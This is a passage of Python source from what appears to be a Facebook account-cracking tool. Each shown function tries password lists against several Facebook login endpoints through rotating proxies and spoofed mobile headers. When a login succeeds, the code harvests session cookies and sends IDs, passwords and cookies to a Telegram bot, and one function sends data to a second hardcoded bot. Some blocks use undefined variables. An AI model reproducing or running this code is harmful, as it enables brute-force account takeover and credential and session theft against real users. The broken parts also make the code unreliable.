            free_fb = session.get('https://m.facebook.com').text
            info={
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In"}
            update={
            'Host': 'm.facebook.com',
            'Connection': 'keep-alive',
            'Content-Length': str(len(str(info))),
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'sec-ch-ua-model': '"SM-G950FD"',
            'sec-ch-ua-mobile': '?1',
            'User-Agent': uger,
            'viewport-width': '400',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-LSD': 'AVr0Bh-X_bY',
            'sec-ch-ua-platform-version': '"9.7.1"',
            'X-ASBD-ID': '129477',
            'dpr': '1.8',
            'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua-platform': '"Android"',
            'Accept': '*/*',
            'Origin': 'https://m.facebook.com',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2F&refsrc=deprecated&_rdr',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8'}
            session.post(f'https://{fb}.facebook.com/login/device-based/regular/login/?',data=info,headers=update,proxies=proxies,allow_redirects=False).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                cid = re.findall('c_user=(.*);xs',kuki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')                        
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                        open('/sdcard/ATOM-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass

def m2(ids,pwv):
    global loop,oks,cps
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M2{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    session = requests.Session()
    ua = ua_valid()
    warna = random.choice(my_color)
    nip=random.choice(proxsi)
    proxs= {'http': 'socks4://'+nip}
    DOMAIN = ("m","business","mbasic")
    fb= random.choice(DOMAIN)
    uger = random.choice(ugrn)
    try:
        for pas in pwv:
            free_fb = session.get(f'https://m.facebook.com').text
            info={
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In"}
            update={
            'authority': f'm.facebook.com',
            'method': 'POST',  # Assuming this is a POST request
            'path': '/',      # Assuming this is the path of the request
            'scheme': 'https',
            'accept': '*/*',
            'accept-language': 'es-MX,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '2.75',
            'origin': f'https://m.facebook.com',
            'referer': f'https://m.facebook.com/?locale2=en_GB',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="120", "Google Chrome";v="118", ";Not A Brand";v="8.0.0.0"',
            'sec-ch-ua-full-version-list': '"Not A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"23128PC33I"',
            'sec-ch-ua-platform': 'Android',
            'sec-ch-ua-platform-version': '"8.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': uger,
            'viewport-width': '393',
            'x-asbd-id': '129477',
            'x-fb-lsd': 'AVq9MsDYu_k',
            'x-requested-with': 'XMLHttpRequest',
            'x-response-format': 'JSONStream'}
            session.post(f'https://{fb}.facebook.com/login/device-based/regular/login/?',data=info,headers=update,allow_redirects=False).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                cid = re.findall('c_user=(.*);xs',kuki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {coki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{uid}|{pas}')
                        open('/sdcard/ATOM-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass

def m3(ids,pwv):
    global loop,oks,cps
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M3{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    session = requests.Session()
    ua = ua_valid()
    warna = random.choice(my_color)
    nip=random.choice(proxsi)
    proxs= {'http': 'socks4://'+nip}
    DOMAIN = ("m","business","mbasic")
    fb= random.choice(DOMAIN)
    uger = random.choice(ugrn)
    try:
        for pas in pwv:
            free_fb = session.get('https://m.facebook.com').text
            info={
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In"}
            update={
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,hi;q=0.8,bn;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '1',
            'origin': f'https://{fb}.facebook.com',
            'priority': 'u=0, i',
            'referer': f'https://{fb}.facebook.com/?locale2=en_GB&_rdr',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.127", "Google Chrome";v="126.0.6478.127"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'viewport-width': '885',}
            session.post(f'https://{fb}.facebook.com/login.php?skip_api_login=1&api_key=607603612709461&kid_directed_site=0&app_id=607603612709461&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fbikroy.com%252Ffacebook-callback%26scope%3Dpublic_profile%252Cemail%26client_id%3D607603612709461%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1bdecab6-4837-4a41-963c-a148f65aa25d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fbikroy.com%2Ffacebook-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',data=info,headers=update,proxies=proxs,allow_redirects=False).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                cid = re.findall('c_user=(.*);xs',kuki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{uid}|{pas}')
                        open('/sdcard/ATOM-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass

def m4(ids,pwv):
    global loop,oks,cps
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M4{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    session = requests.Session()
    ua = ua_valid()
    warna = random.choice(my_color)
    nip=random.choice(proxsi)
    proxs= {'http': 'socks4://'+nip}
    try:
        for pas in pwv:
            free_fb = session.get('https://m.facebook.com').text
            info={
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In"}
            update={
            'authority': 'm.facebook.com',
            'method': 'GET',
            'path': '/login/device-based/login/async/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://m.facebook.com',
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
            session.post('https://m.facebook.com/login/device-based/login/async/',data=info,headers=update,proxies=proxs,allow_redirects=False).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                cid = re.findall('c_user=(.*);xs',kuki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                        open('/sdcard/ATOM-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass

def m5(ids,pwv):
    global loop,oks,cps
    sm_mdl=('SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN','SM-S111DL','SM-A022F','SM-G900P','SM-G986U','SM-G981U','SM-G975U','SM-G981U','SM-G965F','SM-G970U1','SM-G965U','SM-G930T','SM-G930VL','SM-G950U','SM-G981U','SM-N975U','SM-G935U','SM-N960U','SM-G986U','SM-G930R4','SM-N960W','Xiaomi 10 Pro','2201123G','22071212AG','22081212UG','2112123AG','2211133C','Mi 9T Pro','CPH1861','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3063','RMX3501','OPPO 1105','oppo 15','oppo6779','oppo6833','OPPO7273','Oppo A1','PCHM10','CPH2071','CPH2185','CPH2179','A37f','SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V')
    uaD2 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460628;FBDM/{density=1.75,width=720,height=1423};FBLC/pt_BR;FBRV/0;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(sm_mdl))+";FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M5{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    usragnt = DEF1()
    warna = random.choice(my_color)
    try:
        for pas in pwv:
            info= {'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            update={'User-Agent':usragnt,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'htt'+'ps://g'+'raph.face'+'book.com/auth/login'
            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
            if 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        stasok = (f" {usragnt} ")
                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                        oks.append(cid)
                        break
            elif 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        stasok = (f" {usragnt} ")
                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                        oks.append(cid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass



def m6(ids,pwv):
    global loop,oks,cps    
    sm_mdl=('SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H')
    uaD2 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460628;FBDM/{density=1.75,width=720,height=1423};FBLC/pt_BR;FBRV/0;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(sm_mdl))+";FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M6{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    usragnt = DEF2()
    warna = random.choice(my_color)
    try:
        for pas in pwv:
